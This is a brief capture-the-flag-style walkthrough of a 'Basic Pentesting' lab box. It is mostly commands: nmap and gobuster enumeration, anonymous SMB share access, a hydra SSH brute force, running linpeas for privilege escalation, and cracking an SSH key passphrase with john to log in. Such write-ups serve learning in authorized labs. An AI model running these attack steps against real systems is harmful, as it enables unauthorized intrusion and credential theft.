# Basic Pentesting

> thegurpreet | Mar 2021

## Service Enumeration

Scanning ports using nmap
```
sudo nmap -sV -sC $ip
```

## Web directory Enumeration

```
sudo gobuster dir -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 500
```

## Samba Enumeration

Use enum4linux to enumerate
```
enum4linux -a $ip | tee enum4linux.log
```

Mound and access anon SMB share
```
sudo mount //$ip/Anonymous /media/test/
cat /media/test/staff.txt
```

### SSH brute forcing

```
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://$ip
```

### Privilege Escalation

Download linpeas script to source machine first and then transfer using SCP
```
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh > linpeas.sh
scp linpeas.sh jan@10.10.89.2:/dev/shm
```

Execute linpeas on target machine
```
chmod +x /dev/shm/linpeas.sh
sh linpeas.sh
```

Look for SSH keys section
```
[+] Looking for ssl/ssh files
Possible private SSH keys were found!
```

Use john the ripper for brute forcing pass-phrase
```
/usr/share/john/ssh2john.py kay_id_rsa > kay_id_rsa_forjohn.txt
sudo john kay_id_rsa_forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Login with captured information and read the final file
```
chmod 600 kay_id_rsa
ssh -i kay_id_rsa kay@$ip
cat pass.bak
```
